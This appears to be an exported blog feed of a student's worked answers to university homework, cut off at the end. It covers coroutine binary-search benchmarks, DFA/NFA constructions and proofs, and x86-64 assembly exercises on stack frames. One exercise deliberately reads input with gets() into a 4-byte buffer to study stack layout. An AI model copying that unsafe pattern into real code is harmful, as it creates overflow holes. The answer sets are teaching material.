|            46.71            |</p><blockquote><p>此时使用默认参数 <code>m = 1e6</code>, <code>b = 16</code>.</p></blockquote></li><li><p>所给数据范围较小时, 缓存的效果不显著, 在协程调度的轮询与切换上消耗了过多时间, 协程查找效果并不显著;</p></li><li><p>所给数据范围较大时, 协程查找可以在某协程进行 IO 操作时切入其他协程, 实现了时间优化.</p></li><li><p><strong>测试 <code>Loops (m)</code> 的影响因素:</strong></p><p>| Loops (m) | naive (per access) / ns | coroutine (per access) / ns |<br>| :———-: | :——————————-: | :————————————-: |<br>|    80     |          98.74          |            87.52            |<br>|    400    |          82.47          |            57.18            |<br>|   2000    |          75.70          |            51.34            |<br>|   10000   |          67.64          |            50.73            |<br>|  100000   |          59.74          |            51.60            |<br>|  1000000  |          62.28          |            57.86            |<br>| 10000000  |          61.31          |            56.65            |</p><blockquote><p>此时使用默认参数 <code>l = 32</code>, <code>b = 16</code>.</p></blockquote></li><li><p>随着查找次数的增多, 缓存的数据量随着查找次数增大, 在之后进行查找更容易命中缓存, 直接二分查找和协程查找的性能都增强了.</p></li><li><p><strong>测试 <code>Batch size (b)</code> 的影响因素:</strong></p><p>| Batch size (b) | naive (per access) / ns | coroutine (per access) / ns |<br>| :——————: | :——————————-: | :————————————-: |<br>|       4        |          59.46          |            55.01            |<br>|       8        |          62.66          |            51.95            |<br>|       20       |          60.47          |            57.72            |<br>|       32       |          58.93          |            87.17            |<br>|       50       |          63.34          |            86.26            |<br>|       80       |          61.43          |            89.07            |<br>|      100       |          60.58          |            98.05            |<br>|      1000      |          57.43          |           170.98            |<br>|     10000      |          60.23          |           259.12            |</p><blockquote><p>此时使用默认参数 <code>l = 32</code>, <code>m = 1e6</code>.</p></blockquote></li><li><p><code>Batch size</code> 的增大不会影响直接二分查找的性能; <code>Batch size</code> 增大时, 协程查找的性能在增加后迅速降低;</p></li><li><p>当 <code>Batch size</code> 较小时, 协程查找在一次轮询后可能并未完成相应 IO 操作, 浪费了时间; 而当 <code>Batch size</code> 较大时, 协程轮询与调度操作消耗时间过多, 性能降低.</p></li></ul><h2 id="沟通与交流情况"><a href="#沟通与交流情况" class="headerlink" title="沟通与交流情况"></a>沟通与交流情况</h2><ul><li>与陈鑫圣同学交流了如何设计更加高效的 <code>sleep_sort</code>, 以及不同因素对二分查找性能的影响.</li><li>参考了<a href="https://ouuan.github.io/post/lambda-capture-local-variable-by-reference/">本篇文章</a>, 使用 <code>lambda</code> 表达式实现在 <code>sleep()</code> 内更新 <code>ready_func</code> 的操作.</li></ul><h2 id="个人小结与感想"><a href="#个人小结与感想" class="headerlink" title="个人小结与感想"></a>个人小结与感想</h2><p>这是我第一次接触协程的概念与原理, 进行理解与尝试时感到了不小的困难, 在经过习题课对实验框架的具体分析以及自己的尝试后, 我觉得自己更加深刻地了解了协程原理. 通过与同学的交流、对资料的检索, 我明白了考量程序性能的必要性与重要性, 对计算机系统的组成原理有了更为深刻的认识.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>形式语言与自动机 作业4</title>
      <link href="/2022/11/01/xing-shi-yu-yan-yu-zi-dong-ji-zuo-ye-4/"/>
      <url>/2022/11/01/xing-shi-yu-yan-yu-zi-dong-ji-zuo-ye-4/</url>
      
        <content type="html"><![CDATA[<h2 id="必做题"><a href="#必做题" class="headerlink" title="必做题"></a>必做题</h2><h3 id="Ex-3-2-1-c"><a href="#Ex-3-2-1-c" class="headerlink" title="Ex 3.2.1 (c)"></a>Ex 3.2.1 (c)</h3><p>​    构造基础表达式:</p><p><img src="/pic/27.png" alt=""></p><p>​    考虑只经过状态 $1$ 的路径的正则表达式:</p><p><img src="/pic/28.png" alt=""></p><p>​    考虑经过任意状态的路径的正则表达式:</p><p><img src="/pic/29.png" alt=""></p><h3 id="Ex-3-2-1-d"><a href="#Ex-3-2-1-d" class="headerlink" title="Ex 3.2.1 (d)"></a>Ex 3.2.1 (d)</h3><p>​    该 $DFA$ 的语言对应的一个正规表达式为:</p><p>​    <script type="math/tex">R_{13}^{(3)} = R_{13}^{(2)} + R_{13}^{(2)}{(R_{33}^{(2)})}^{*}R_{33}^{(2)} = \mathbf{1^*0(11^*0)^*0(0 + 1(11^*0)^*0)^*}.</script></p><h3 id="Ex-3-2-3"><a href="#Ex-3-2-3" class="headerlink" title="Ex 3.2.3"></a>Ex 3.2.3</h3><p>​    该自动机的原始状态图为:</p><p><img src="/pic/30.png" alt=""></p><p>​    消去状态 $q$ 后的状态图为:</p><p><img src="/pic/31.png" alt=""></p><p>​    消去状态 $r$ 后的状态图为:</p><p><img src="/pic/32.png" alt=""></p><p>​    消去状态 $s$ 后的状态图为:</p><p><img src="/pic/33.png" alt=""></p><p>​    故这个 $DFA$ 转化为正则表达式为:</p><p>​    <script type="math/tex">\mathbf{(1 + 0(01 + 10^*11)^*(00 + 10^*10))^*}.</script></p><h3 id="Ex-3-2-4-b"><a href="#Ex-3-2-4-b" class="headerlink" title="Ex 3.2.4 (b)"></a>Ex 3.2.4 (b)</h3><p>​    一个满足题意的 $\varepsilon-NFA$ 为:</p><p><img src="/pic/34.png" alt=""></p><h3 id="Ex-3-2-4-c"><a href="#Ex-3-2-4-c" class="headerlink" title="Ex 3.2.4 (c)"></a>Ex 3.2.4 (c)</h3><p>​    一个满足题意的 $\varepsilon-NFA$ 为:</p><p><img src="/pic/35.png" alt=""></p><h3 id="Ex-3-2-6"><a href="#Ex-3-2-6" class="headerlink" title="Ex 3.2.6"></a>Ex 3.2.6</h3><p>​    $(a)$ 为 $L^*$;</p><p>​    $(b)$ 为 $L$ 中所有字符串的所有后缀串组成的集合;</p><p>​    $(c)$ 为 $L$ 中所有字符串的所有前缀串组成的集合;</p><p>​    $(d)$ 为 $L$ 中所有字符串的所有子串组成的集合.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> FL&amp;A </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FL&amp;A </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>形式语言与自动机 作业3</title>
      <link href="/2022/10/29/xing-shi-yu-yan-yu-zi-dong-ji-zuo-ye-3/"/>
      <url>/2022/10/29/xing-shi-yu-yan-yu-zi-dong-ji-zuo-ye-3/</url>
      
        <content type="html"><![CDATA[<h2 id="必做题"><a href="#必做题" class="headerlink" title="必做题"></a>必做题</h2><h3 id="Ex-2-2-2"><a href="#Ex-2-2-2" class="headerlink" title="Ex 2.2.2"></a>Ex 2.2.2</h3><p>​    对任意状态 $q$ 及串 $x$ 和 $y$, 我们证明 $\hat\delta(q, xy) = \hat\delta(\hat\delta(q, x), y)$.</p><p>​    对 $\vert y\vert$ 进行归纳:</p><p>​    \textbf{<strong>基础:</strong>} 如果 $\vert y\vert = 0$, 即 $y = \varepsilon$, </p><p>​    那么由 $\hat\delta$ 的定义知 </p><p>​    <script type="math/tex">\hat\delta(\hat\delta(q, x), y) = \hat\delta(\hat\delta(q, x), \varepsilon) = \hat\delta(q, x) = \hat\delta(q, xy),</script></p><p>​    至此基础得证.</p><p>​    \textbf{<strong>归纳:</strong>} 现假定 $\vert y\vert = n\thinspace(n\ge 1)$, 且对任何串 $y_0\thinspace(\vert y_0\vert &lt; n)$, 上述命题为真.</p><p>​    也就是说, 如果 $\vert y_0\vert \le n - 1$, 那么$\hat\delta(q, xy_0) = \hat\delta(\hat\delta(q, x), y_0)$.</p><p>​    设 $y = y_0a$, 其中 $a$ 为串 $y$ 的最后一个元素.</p><p>​    那么结合 $\hat\delta$ 的定义得:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            \hat\delta(\hat\delta(q, x), y) &amp;= \hat\delta(\hat\delta(q, x), y_0a) \\</p><p>​            &amp;= \delta(\hat\delta(\hat\delta(q, x), y_0), a) \\</p><p>​            &amp;= \delta(\hat\delta(q, xy_0), a) \\</p><p>​            &amp;= \hat\delta(q, xy_0a) \\</p><p>​            &amp;= \hat\delta(q, xy).</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><p>​    至此归纳得证.</p><h3 id="Ex-2-2-4-b"><a href="#Ex-2-2-4-b" class="headerlink" title="Ex 2.2.4 (b)"></a>Ex 2.2.4 (b)</h3><p>​    一个接受该语言的 $DFA$ 的转移表为:</p><p>​        <img src="/pic/14.png" alt=""></p><h3 id="Ex-2-2-4-c"><a href="#Ex-2-2-4-c" class="headerlink" title="Ex 2.2.4 (c)"></a>Ex 2.2.4 (c)</h3><p>​    一个接受该语言的 $DFA$ 的转移表为:</p><p>​        <img src="/pic/15.png" alt=""></p><h3 id="Ex-2-2-5-d"><a href="#Ex-2-2-5-d" class="headerlink" title="Ex 2.2.5 (d)"></a>Ex 2.2.5 (d)</h3><p>​    一个接受该语言的 $DFA$ 的转移表为:</p><p>​        <img src="/pic/16.png" alt=""></p><h3 id="Ex-2-2-7"><a href="#Ex-2-2-7" class="headerlink" title="Ex 2.2.7"></a>Ex 2.2.7</h3><p>​    对任意输入串 $w$, 我们证明 $\hat\delta(q, w) = q$.</p><p>​    对 $\vert w\vert$ 进行归纳:</p><p>​    \textbf{<strong>基础:</strong>} 如果 $\vert w\vert = 0$, 即 $w = \varepsilon$, </p><p>​    那么由 $\hat\delta$ 的定义知 </p><p>​    <script type="math/tex">\hat\delta(q, w) = \hat\delta(q, \varepsilon) = q,</script></p><p>​    至此基础得证.</p><p>​    \textbf{<strong>归纳:</strong>} 现设 $\vert w\vert = n\thinspace(n\ge 1)$, 且对任何串 $w_0\thinspace(\vert w_0\vert &lt; n)$ 上述命题为真.</p><p>​    也就是说, 如果$\vert w_0\vert \le n - 1$, 那么$\hat\delta(q, w_0) = q$.</p><p>​    设 $w = w_0a$, 其中 $a$ 为串 $w$ 的最后一个元素.</p><p>​    那么结合 $\hat\delta$ 的定义得:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            \hat\delta(q, w) &amp;= \hat\delta(q, w_0a) \\</p><p>​            &amp;= \delta(\hat\delta(q, w_0), a) \\</p><p>​            &amp;= \delta(q, a) \\</p><p>​            &amp;= q.</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><p>​    至此归纳得证.</p><h3 id="Ex-2-2-9"><a href="#Ex-2-2-9" class="headerlink" title="Ex 2.2.9"></a>Ex 2.2.9</h3><p>​    $(a)$</p><p>​    对任意输入串 $w\ne\varepsilon$, 我们证明 $\hat\delta(q_0, w) = \hat\delta(q_f, w)$.</p><p>​    对 $\vert w\vert$ 进行归纳:</p><p>​    \textbf{<strong>基础:</strong>} 如果 $\vert w\vert = 1$,</p><p>​    那么由 $w\in\Sigma$, 结合已知得</p><p>​    <script type="math/tex">\hat\delta(q_0, w) = \hat\delta(q_f, w),</script></p><p>​    至此基础得证.</p><p>​    \textbf{<strong>归纳:</strong>} 现设 $\vert w\vert = n\thinspace(n\ge 2)$, 且对任何串 $w_0\thinspace(\vert w_0\vert &lt; n)$ 上述命题为真.</p><p>​    也就是说, 如果$\vert w_0\vert \le n - 1$, 那么$\hat\delta(q_0, w_0) = \hat\delta(q_f, w_0)$.</p><p>​    设 $w = w_0a$, 其中 $a$ 为串 $w$ 的最后一个元素.</p><p>​    那么结合 $\hat\delta$ 的定义得:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            \hat\delta(q_0, w) &amp;= \hat\delta(q_0, w_0a) \\</p><p>​            &amp;= \delta(\hat\delta(q_0, w_0), a) \\</p><p>​            &amp;= \delta(\hat\delta(q_f, w_0), a) \\</p><p>​            &amp;= \hat\delta(q_f, w_0a).</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><p>​    至此归纳得证.</p><p>​    $(b)$</p><p>​    已知 $\hat\delta(q_0, x) = q_f$. 对任意 $k &gt; 0$, 我们证明 $\hat\delta(q_0, x^k) = q_f$.</p><p>​    对 $k$ 进行归纳:</p><p>​    \textbf{<strong>基础:</strong>} 如果 $k = 1$, 那么由已知得</p><p>​    <script type="math/tex">\hat\delta(q_0, x^k) = \hat\delta(q_0, x) = q_f,</script></p><p>​    至此基础得证.</p><p>​    \textbf{<strong>归纳:</strong>} 考虑 $k\ge 2$, 现设对任何 $k_0 &lt; k$ 上述命题为真,</p><p>​    也就是说, 如果$k_0\le k - 1$, 那么$\hat\delta(q_0, x^{k_0}) = q_f$.</p><p>​    由 $Ex 2.2.2$ 已证结论得:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            \hat\delta(q_0, x^k) &amp;= \hat\delta(q_0, x^{k - 1}x) \\</p><p>​            &amp;= \hat\delta(\hat\delta(q_0, x^{k - 1}), x) \\</p><p>​            &amp;= \hat\delta(q_f, x) \\</p><p>​            &amp;= \hat\delta(q_0, x) \\</p><p>​            &amp;= q_f.</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><p>​    至此归纳得证.</p><h3 id="Ex-2-3-2"><a href="#Ex-2-3-2" class="headerlink" title="Ex 2.3.2"></a>Ex 2.3.2</h3><p>​    一个接受该 $NFA$ 的 $DFA$ 的转移表为:</p><p>   <img src="/pic/17.png" alt=""></p><h3 id="Ex-2-3-4-b"><a href="#Ex-2-3-4-b" class="headerlink" title="Ex 2.3.4 (b)"></a>Ex 2.3.4 (b)</h3><p>​    一个接受该语言的 $NFA$ 为:<br>​    <script type="math/tex">A = (Q, \Sigma, \delta, q, F).</script></p><p>​    其中<br>​    <script type="math/tex">Q = \left\{q_s, q_0, q_1, \cdots, q_9, q_f\right\},</script><br>​    <script type="math/tex">\Sigma = \left\{0, 1,\cdots ,9\right\},</script><br>​    <script type="math/tex">q = q_s,</script><br>​    <script type="math/tex">F = \left\{q_f\right\}</script></p><p>​    并且<br>​    <script type="math/tex">\delta(q_s,a) = \left\{q_k\mid k\ne a\right\}\cup\left\{q_f\right\},</script><br>​    <script type="math/tex">\delta(q_k,a) = \left\{q_k\right\}, \mbox{当} k\ne a ;</script><br>​    <script type="math/tex">\delta(q_k,a) = \left\{q_f\right\}, \mbox{当}k = a.</script></p><p>​    其中 $k = 0, 1, \cdots, 9.$    </p><h3 id="Ex-2-3-4-c"><a href="#Ex-2-3-4-c" class="headerlink" title="Ex 2.3.4 (c)"></a>Ex 2.3.4 (c)</h3><p>​    一个接受该语言的 $NFA$ 的转移表为:</p><p>   <img src="/pic/18.png" alt=""></p><h3 id="Ex-2-4-2-c"><a href="#Ex-2-4-2-c" class="headerlink" title="Ex 2.4.2 (c)"></a>Ex 2.4.2 (c)</h3><p>​    一个满足题意的 $NFA$ 为:</p><p>   <img src="/pic/19.png" alt=""></p><p>​    将其转化为满足题意的 $DFA$:</p><p>   <img src="/pic/20.png" alt=""> </p><p>​    此即转化后的结果.</p><h3 id="Ex-2-5-2"><a href="#Ex-2-5-2" class="headerlink" title="Ex 2.5.2"></a>Ex 2.5.2</h3><p>​    $(1)$ 计算可得</p><p>​    $ECLOSE(p) = \left\{p, q, r\right\}$, $ECLOSE(q) = \left\{q\right\}$, $ECLOSE(r) = \left\{r\right\}$.</p><p>​    $(2)$ 这个自动机接受的长度小于等于 $3$ 的串有:<br>​    <script type="math/tex">\varepsilon, a, b, c, aa, ab, ac, ba, bb, bc, ca, cb, cc, aaa, aab, aac,</script><br>​    <script type="math/tex">aba, abb, abc, aca, acb, acc, baa, bab, bac, bca, bcb, bcc,</script><br>​    <script type="math/tex">caa, cab, cac, cba, cbb, cbc, cca, ccb, ccc.</script></p><p>​    $(3)$ 一个接受该 $\varepsilon-NFA$ 的 $DFA$ 的转移表为:</p><p>​             <img src="/pic/21.png" alt=""> </p><h3 id="Ex-2-5-3-a"><a href="#Ex-2-5-3-a" class="headerlink" title="Ex 2.5.3 (a)"></a>Ex 2.5.3 (a)</h3><p>​    一个接受该 $NFA$ 的转移表为:</p><p>​             <img src="/pic/22.png" alt=""> </p><h3 id="Ex-2-5-3-b"><a href="#Ex-2-5-3-b" class="headerlink" title="Ex 2.5.3 (b)"></a>Ex 2.5.3 (b)</h3><p>​    一个接受该 $NFA$ 的转移表为:</p><p>​             <img src="/pic/23.png" alt=""> </p><h3 id="Ex-2-5-3-c"><a href="#Ex-2-5-3-c" class="headerlink" title="Ex 2.5.3 (c)"></a>Ex 2.5.3 (c)</h3><p>​    一个接受该 $NFA$ 的转移表为:</p><p>​            <img src="/pic/24.png" alt=""> </p><h3 id="Ex-4-4-2-c"><a href="#Ex-4-4-2-c" class="headerlink" title="Ex 4.4.2 (c)"></a>Ex 4.4.2 (c)</h3><p>​    这个自动机的可区分性表为:</p><p>​            <img src="/pic/25.png" alt=""> </p><p>​    其最小状态的等价 $DFA$ 的转移表为:</p><p>​            <img src="/pic/26.png" alt=""> </p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> FL&amp;A </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FL&amp;A </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论 作业3</title>
      <link href="/2022/10/26/ji-suan-ji-xi-tong-gai-lun-zuo-ye-3/"/>
      <url>/2022/10/26/ji-suan-ji-xi-tong-gai-lun-zuo-ye-3/</url>
      
        <content type="html"><![CDATA[<h1 id="HW-3"><a href="#HW-3" class="headerlink" title="HW 3"></a>HW 3</h1><ol><li><p>编程解决猴子吃桃问题: 每天吃一半再多吃一个, 第十天想吃时候只剩一个,  问总共有多少. 该程序的 $C$ 语言程序如下, 请在其对应汇编代码 ($Linux X86- 64$) 内填入缺失内容.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">eat_peaches</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">eat_peaches</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">eat_peaches:    cmpl $10, __①__    je   __②__    subq $8, %rsp    addl $1, %edi    call eat_peaches    leal 2(%rax, __③__), %eax    jmp  __④__.L3:movl $1, %eax __⑤__ .L2:    addq __⑥__, %rsp    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">①<span class="token operator">:</span> <span class="token operator">%</span>edi②<span class="token operator">:</span> <span class="token punctuation">.</span>L3③<span class="token operator">:</span> <span class="token operator">%</span>rax④<span class="token operator">:</span> <span class="token punctuation">.</span>L2⑤<span class="token operator">:</span> ret⑥<span class="token operator">:</span> $<span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>有下列 $C$ 代码以及对应的汇编代码 ($Linux X86-64$), 请填充下表, 即给出各个变量或者寄存器在栈中的存储位置 (以相对于栈帧基址寄存器 <code>%rbp​</code> 的十进制偏移量形式给出, 可正可负); 如果无法以 “在栈中的存储位置” 形式给出, 请说明理由.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xF0F1F2F3</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span><span class="token function">gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a[0] = 0x%x, a[1] = 0x%x, buf = %s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.LC0:.string "a[0] = 0x%x, a[1] = 0x%x, buf = %s\n"foo:    pushq %rbp    movq  %rsp, %rbp    pushq %rbx    subq  $24, %rsp    movl  %edi, %ebx    leaq  -32(%rbp), %rdi    movl  $0, %eax    call  gets    leaq  -32(%rbp), %rcx    movl  %ebx, %edx    movl  $-252579085, %esi    movl  $.LC0, %edi    movl  $0, %eax    call  printf    addq  $24, %rsp    popq  %rbx    popq  %rbp    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre> <center>|      变量       | 十进制形式的 $offset$ (或者说明) || :-------------: | :------------------------------: ||       `a`       |          经过优化, 未在栈帧中存储          ||     `a[2]`      |          经过优化, 未在栈帧中存储          ||       `x`       | 存储在 `%rbx` 中, 未在栈帧中存储 ||      `buf`      |              $-32$               ||    `buf[3]`     |              $-29$               || `%rbx` 的保存值  |               $-8$               | </center></li><li><p>过程调用以及返回的顺序在一般情况下都是 “过程返回的顺序恰好与调用顺序相反”, 但是我们可以利用汇编以及对运行栈的理解来编写汇编过程打破这一惯例.</p><p>有如下汇编代码 ( $x86-32$ 架构 ), 其中 <code>GET</code> 过程唯一的输入参数是一个用于存储当前处理器以及栈信息的内存块地址 (假设该内存块的空间足够大), 而 <code>SET</code> 过程则用于恢复被 <code>GET</code> 过程所保存的处理器及栈信息, 其唯一的输入参数也是该内存块地址. 在理解代码的基础上, 回答下列问题:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">GET:    movl 4(%esp), %eax     #(A)    …    movl %edi, 20(%eax)    movl %esi, 24(%eax)    movl %ebp, 28(%eax)    movl %ebx, 36(%eax)    movl %edx, 40(%eax)    movl %ecx, 44(%eax)    movl $1, 48(%eax)     movl (%esp), %ecx      #(B)    movl %ecx, 60(%eax)    leal 4(%esp), %ecx     #(C)    movl %ecx, 72(%eax)    movl 44(%eax), %ecx    movl $0, %eax    retSET:    movl 4(%esp), %eax    …    movl 20(%eax), %edi    movl 24(%eax), %esi    movl 28(%eax), %ebp    movl 36(%eax), %ebx    movl 40(%eax), %edx    movl 44(%eax), %ecx    movl ____ (%eax), %esp #(D)    pushl 60(%eax)         #(E)    movl 48(%eax), %eax    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(1) <code>SET​</code> 过程的返回地址是什么, 其返回值是多少? </p><p><strong>解答:</strong></p><p>返回地址为 <code>GET</code> 函数的下一条地址; 返回值为 $1$.</p><p>(2) 代码段中的 $(A)$ 指令执行后，<code>eax</code> 中存放的是什么? $(B)$ 指令执行后, <code>ecx</code> 中存放的是什么? $(C)$ 指令的作用是什么? $(E)$ 指令的作用是什么? 并将 $(D)$ 指令补充完整.</p><p><strong>解答:</strong></p><p>$(A)$ 指令执行后, <code>eax​</code> 中存放的是用于存储处理器与栈信息的内存块的地址, 即 <code>GET</code> 函数的输入参数;</p><p>$(B)$ 指令执行后, <code>ecx​</code> 中存放的是 <code>GET</code> 函数的返回地址;</p><p>$(C)$ 指令的作用是临时存储 <code>4(%rsp)</code> 的内容, 并中转至目标内存中;</p><p>$(E)$ 指令的作用是将之前记录的 <code>GET</code> 函数的返回地址压入栈, <code>ret</code> 指令跳转到之前的相应地址;</p><p>$(D)$ 指令需填入 $72$.</p></li><li><p>请分别对照下列的 $C$ 代码与对应的汇编代码, 解释下 $C$ 函数是如何传入 <code>struct​</code> 类型参数的, 可以通过画出 <code>call input_struct</code> 时栈的 $layout$, 并辅以说明来解释.</p><p>1) <code>gcc –Og ...​</code></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span><span class="token keyword">int</span> age<span class="token punctuation">;</span> <span class="token keyword">int</span> bye<span class="token punctuation">;</span> <span class="token keyword">int</span> coo<span class="token punctuation">;</span> <span class="token keyword">int</span> ddd<span class="token punctuation">;</span> <span class="token keyword">int</span> eee<span class="token punctuation">;</span><span class="token punctuation">}</span> TEST_Struct<span class="token punctuation">;</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">input_struct</span><span class="token punctuation">(</span>TEST_Struct in_struct<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> in_struct<span class="token punctuation">.</span>eee <span class="token operator">+</span> in_struct<span class="token punctuation">.</span>age <span class="token operator">*</span> <span class="token number">2</span> <span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">function2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>TEST_Struct main_struct<span class="token punctuation">;</span>main_struct<span class="token punctuation">.</span>age <span class="token operator">=</span> i<span class="token punctuation">;</span>main_struct<span class="token punctuation">.</span>bye <span class="token operator">=</span> i<span class="token punctuation">;</span>main_struct<span class="token punctuation">.</span>coo <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> i<span class="token punctuation">;</span>main_struct<span class="token punctuation">.</span>ddd <span class="token operator">=</span> i<span class="token punctuation">;</span>main_struct<span class="token punctuation">.</span>eee <span class="token operator">=</span> i<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">input_struct</span><span class="token punctuation">(</span>main_struct<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">input_struct:    movl 8(%rsp), %eax    #age    addl %eax, %eax    addl 24(%rsp), %eax   #eee    retfunction2:    subq $56, %rsp    movl i(%rip), %eax    movl %eax, 24(%rsp)   #age    movl %eax, 28(%rsp)   #bye    leal (%rax,%rax), %edx    movl %edx, 32(%rsp)   #coo    movl %eax, 36(%rsp)   #ddd    movq 24(%rsp), %rdx    movq %rdx, (%rsp)     #age/bye    movq 32(%rsp), %rdx    movq %rdx, 8(%rsp)    #coo/ddd     movl %eax, 16(%rsp)   #eee    call input_struct    addq $56, %rsp    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>解答：</strong></p><p>在栈帧中存储结构体实例. 在发生调用 <code>call input_struct​</code> 前, 在 <code>24(%rsp)</code> 开始由低地址向高地址存储 <code>age</code>, <code>bye</code>, <code>coo</code>, <code>ddd</code>. 随后将这些信息转移到 <code>%rsp</code> 开始的低地址内存中, 并附加 <code>eee</code>.</p><div align="center"><img src="/pic/9.png" width="20%" height="20%"></div><p>调用 <code>call input_struct</code> 后, 返回地址被压入栈中, 此时通过 <code>8(%rsp)</code> 访问的即是 <code>in_struct.age</code>, 通过 <code>24(%rsp)</code> 访问的即是 <code>in_struct.eee</code>.</p><div align="center"><img src="/pic/10.png" width="20%" height="20%"></div><p>2) $C$ 代码不变, 通过 <code>gcc -O1/2 ...</code> 编译后的汇编如下: </p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">input_struct:    movl 24(%rsp), %eax    movl 8(%rsp), %edx    leal (%rax,%rdx,2), %eax    retfunction2:    movl i(%rip), %eax    leal (%rax,%rax,2), %eax    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>请分析针对这段代码, 编译器做了什么优化工作.</p><p><strong>解答:</strong></p><p>使用一步 <code>leal</code> 指令替代原本的两步 <code>addl</code> 指令;</p><p>直接使用全局变量 <code>i</code> 代替已知相等的 <code>in_struct.age</code>、 <code>in_struct.age</code> 进行计算.</p><p>3) 如果在上面的 $C$ 代码的 <code>int​ input_struct</code> 声明前加上 ​<code>static</code>, 经 <code>gcc –O1/2 ...</code> 编译后的代码如下:</p><pre class="line-numbers language-assembly" data-language="assembly"><code 